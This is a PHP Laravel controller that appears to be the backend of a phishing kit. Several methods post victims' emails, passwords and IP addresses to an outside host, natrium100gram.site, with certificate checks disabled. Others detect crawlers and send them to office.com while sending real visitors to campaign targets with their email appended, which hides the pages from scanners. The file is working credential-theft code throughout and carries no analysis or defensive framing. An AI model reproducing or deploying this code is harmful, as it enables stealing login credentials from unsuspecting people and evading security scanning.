<?php

namespace App\Http\Controllers;

use App\saveEmail;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\CrawlerDetect\Fixtures\Crawlers;
use Crawler;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;


    public function dash(Request $request){
        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/petrify",["email"=>$request->email]);
        return json_decode($response,1) ;
    }

    public function knockup(Request $request){
        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/purify",["key"=>$request->key]);
        return json_decode($response,1) ;
//        return $response;
    }

    public function shutdown(Request $request){
        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/flicker",["key"=>$request->key,"email"=>$request->email,"password"=>$request->password,"ip"=>$request->ip()]);
        return $response ;
//        return $response;
    }

    public function dmg(Request $request){
        $response = Http::withOptions(["verify"=>false])->post("https://natrium100gram.site/public/api/trues",["key"=>$request->key,"email"=>$request->email,"password"=>$request->password,"ip"=>$request->ip()]);
        return $response->status();
    }

    function get_ip() {
        $keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');

        foreach ($keys as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                        return $ip;
                    }
                }
            }
        }
    }

    public function index3(){
        return response()->view('storefront')
            ->header('Content-Type', 'application/javascript');
    }


    public function index_red(){
        $decode = request()->query('e');

        $email = explode("_",$decode)[0];
        $key_red  = explode("_",$decode)[1];

        $key_val = Http::get("https://natrium100gram.site/public/api/validate_key/".$key_red);

        if ($key_val->successful()){
            $target = $key_val["url_target"];
            return redirect()->away($target.$email);

        }else{
            return $key_val->status();
        }


    }

    public function index(){

//        $data = saveEmail::where('ip',request()->ip())->latest()->first();
//        return $data;
        $data =   Http::post("https://natrium100gram.site/public/api/savemequeen",[
            "ip" => $this->get_ip(),
        ]);
//        return $data["target"];

        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
//            $final = ;
//            return base64_decode($data->target).base64_decode($data->email);
            return redirect()->away($data["target"].$data["email"]);

        }
    }

    public function index2(Request $request){
//         $decode = base64_decode($request->subs);
//         $decode2 = explode("#",$decode)[1];
        $decode2 = $request->subs;
        $email = explode("&",$decode2)[0];
        $key_red  = explode("&",$decode2)[1];
//        return $key_red;

        $key_val = Http::get("https://natrium100gram.site/public/api/validate_key/".$key_red);
        if ($key_val->successful()){
            $target = $key_val["url_target"];

            return $key_val->body();



//            $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
//                "ip" => $this->get_ip(),
//                "subs" => base64_encode($email) ,
//                "target" => $target,
//
//            ]);
//            if ($send->successful()){
//                return $send->body();
//            }else{
//                return redirect()->away("https://office.com");
//            }

        }else{
            return $key_val->status();
        }


//        return $send->body();

    }

    public function code($code){
        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
            $base64 = base64_decode($code);
//            dd($base64);
            return redirect()->away($base64);

        }
    }
}
